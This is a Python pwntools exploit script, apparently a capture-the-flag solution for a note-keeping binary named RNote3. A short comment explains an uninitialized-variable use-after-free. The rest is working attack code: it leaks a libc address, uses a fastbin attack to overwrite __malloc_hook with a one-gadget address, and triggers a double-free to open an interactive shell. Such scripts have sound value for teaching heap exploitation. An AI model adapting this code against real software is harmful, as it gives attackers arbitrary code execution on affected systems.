# Uninitialized variable when deleting a note => UAF
#
# Viewing a note and then deleting one with an invalid title will still free whatever is at [rbp - 0x18],
# without zeroing out the entry, leading to a UAF.

from pwn import *

def alloc(title, size, content):
	r.sendline('1')

	if len(title) < 8:
		title += '\n'
	r.sendafter('title: ', title)
	r.sendlineafter('size: ', str(size))

	if len(content) < size:
		content += '\n'
	r.sendafter('content: ', content)

def view(title):
	r.sendline('2')
	if len(title) < 8:
		title += '\n'
	r.sendafter('title: ', title)
	

def edit(title, data):
	r.sendline('3')
	if len(title) < 8:
		title += '\n'
	r.sendafter('title: ', title)
	r.sendlineafter('content: ', data)

def free(title):
	r.sendline('4')
	if len(title) < 8:
		title += '\n'
	r.sendafter('title: ', title)

def leak(data):
	view(data)
	r.recvuntil('content: ')
	return u64(r.recv(6).ljust(8, chr(0)))

def menu():
	r.recvuntil('Exit\n')

def pwn():

	menu()

	alloc('A'*8, 0x80, 'A'*8) # 0
	# Prevent consolidation with top chunk
	alloc('B'*8, 0x68, 'B'*8) # 1

	view('A'*8)
	# free note #0
	free('kek')

	libc        = leak(p8(0)) - 0x3c4b78
	malloc_hook = libc + 0x3c4b10 - 0x23
	magic       = libc + 0xf02a4

	log.success('Libc: 0x{:x}'.format(libc))

	alloc('C'*8, 0x68, 'C'*8) # 2

	view('C'*8)
	# free note #0/#2
	free('kek')

	# Fastbin attack
	edit(p8(0), p64(malloc_hook))

	alloc('D'*8, 0x68, 'D'*8) # 3
	alloc('E'*8, 0x68, 'A'*0x13 + p64(magic)) 

	# trigger double-free
	view('D'*8)
	# free note #3
	free('kek')
	free('kek')
	
	r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('',)
        pwn()
    else:
        r = process('./RNote3')
        pause()
        pwn()
